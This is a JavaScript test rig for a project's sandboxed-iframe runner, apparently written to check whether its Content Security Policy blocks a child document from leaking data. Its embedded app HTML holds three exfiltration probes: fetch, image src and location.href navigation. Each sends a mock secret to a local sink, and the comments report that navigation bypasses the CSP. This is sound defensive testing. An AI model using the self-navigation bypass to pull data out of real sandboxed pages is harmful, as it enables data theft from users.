// SPDX-License-Identifier: AGPL-3.0-only
// Copyright (C) 2026 2nd1st
// test/rig-sandbox-exfil.mjs — does the runner CSP actually stop a child from leaking data?
//
// NOT in `npm test`: it needs a real browser. Node cannot answer this question at all — the
// thing under test is what a browser engine does with a navigation, and no amount of reading
// CSP strings substitutes for that. (`test/rig-version-radius.mjs` is the same shape: a
// standalone instrument, run by hand.)
//
// Run:  node test/rig-sandbox-exfil.mjs
//       then open http://127.0.0.1:18941 in a browser and watch this process's stdout.
//
// ── What it found, 2026-07-29 (Chrome 150, macOS) ──────────────────────────────
//   P1 fetch()        → blocked    (connect-src 'none')
//   P2 <img src>      → blocked    (img-src data:)
//   P3 location.href  → 🔴 WENT THROUGH, carrying the payload
//
//   sink log: `🔔 SINK 收到: /p3-nav?d=collection-row-42%3Auser-private-value`
//
// So the CSP works for everything it covers, and navigation is not covered: CSP has no
// directive that governs a document navigating ITSELF (`navigate-to` was dropped and never
// shipped in Chrome), and the sandbox withholds top/ancestor navigation, not
// self-navigation. `form-action 'none'` closes the sibling shape — a form POST — which is why
// the runner comment reasons about navigation at all; the reasoning just was not carried to
// `location.href`.
//
// ⚠️ The rig is built from PRODUCT code on purpose: the child document comes from the real
// `composeChildDoc()`, and the mount copies `src/shell-runtime.js:882/1051` verbatim
// (`sandbox="allow-scripts allow-forms"` + `srcdoc`). A hand-rolled approximation would be
// testing itself — which is also why the sandbox value tracks the product's: the rig stops being
// a faithful repro the moment it mounts under a boundary nothing in the product uses.
//
// ⚠️ The three probes are one experiment, not three: P1/P2 are the CONTROLS. If they were also
// "blocked" because the page never ran, a zero-hit sink would read as "exfil is closed" — which
// is exactly what happened on the first attempt here (the child doc contains `</script>`, which
// closed the parent's own script tag; the rig never mounted and the sink stayed silent). A run
// where P1/P2 do not report "blocked" proves nothing either way — re-run it.
import { createServer } from "node:http";
import { composeChildDoc } from "../src/runner.mjs";

const PARENT_PORT = 18941;
const SINK_PORT = 18942;
const SINK = `http://127.0.0.1:${SINK_PORT}`;

const hits = [];
createServer((req, res) => {
  hits.push(req.url);
  console.log(`  🔔 SINK 收到: ${req.url}`);
  res.writeHead(200, { "content-type": "text/plain" });
  res.end("ok");
}).listen(SINK_PORT, "127.0.0.1");

// An ordinary app's HTML. Nothing privileged, no bridge call — just the bytes an author ships.
const APP_HTML = `
<h1>sandbox exfil probe</h1><pre id="log"></pre>
<script>
  var SECRET = "collection-row-42:user-private-value";
  var L = document.getElementById("log");
  var say = function (m) { L.textContent += m + "\\n"; try { parent.postMessage({ ubProbe: m }, "*"); } catch (e) {} };
  try {
    fetch("${SINK}/p1-fetch?d=" + encodeURIComponent(SECRET))
      .then(function () { say("P1 fetch: WENT THROUGH"); })
      .catch(function (e) { say("P1 fetch: blocked (" + e.message + ")"); });
  } catch (e) { say("P1 fetch: blocked sync (" + e.message + ")"); }
  var im = new Image();
  im.onload = function () { say("P2 img: WENT THROUGH"); };
  im.onerror = function () { say("P2 img: blocked"); };
  im.src = "${SINK}/p2-img?d=" + encodeURIComponent(SECRET);
  setTimeout(function () {
    say("P3 nav: attempting location.href …");
    try { location.href = "${SINK}/p3-nav?d=" + encodeURIComponent(SECRET); }
    catch (e) { say("P3 nav: threw (" + e.message + ")"); }
  }, 600);
</script>`;

const CHILD_DOC = composeChildDoc(APP_HTML, {});
// `</` must be escaped: the child document contains a `<\/script>` and would otherwise close the
// PARENT's script element. This bit us once — see the warning at the top.
const CHILD_LITERAL = JSON.stringify(CHILD_DOC).replaceAll("</", "<\\/");

const PARENT_HTML = `<!doctype html><meta charset="utf-8"><title>sandbox exfil rig</title>
<h2>runner sandbox — self-navigation exfil</h2>
<div id="status">mounting…</div><pre id="msgs"></pre>
<script>
  var msgs = document.getElementById("msgs");
  addEventListener("message", function (e) { if (e.data && e.data.ubProbe) msgs.textContent += e.data.ubProbe + "\\n"; });
  var frame = document.createElement("iframe");            // ← src/shell-runtime.js:882
  frame.setAttribute("sandbox", "allow-scripts allow-forms");
  frame.style.cssText = "width:520px;height:220px;border:1px solid #999";
  document.body.appendChild(frame);
  frame.srcdoc = ${CHILD_LITERAL};                          // ← src/shell-runtime.js:1051
  document.getElementById("status").textContent = "mounted (sandbox=allow-scripts allow-forms, srcdoc=composeChildDoc)";
</script>`;

createServer((req, res) => {
  res.writeHead(200, { "content-type": "text/html; charset=utf-8" });
  res.end(PARENT_HTML);
}).listen(PARENT_PORT, "127.0.0.1", () => {
  console.log(`rig: http://127.0.0.1:${PARENT_PORT}    sink: ${SINK}`);
  console.log(`child CSP: ${CHILD_DOC.match(/content="([^"]+)"/)[1]}`);
  console.log("open the rig URL in a browser; a 🔔 line below means data left the sandbox.");
});

setInterval(() => {
  if (hits.length) console.log(`  [summary] ${hits.length} hit(s): ${hits.map((h) => h.split("?")[0]).join(", ")}`);
}, 5000);
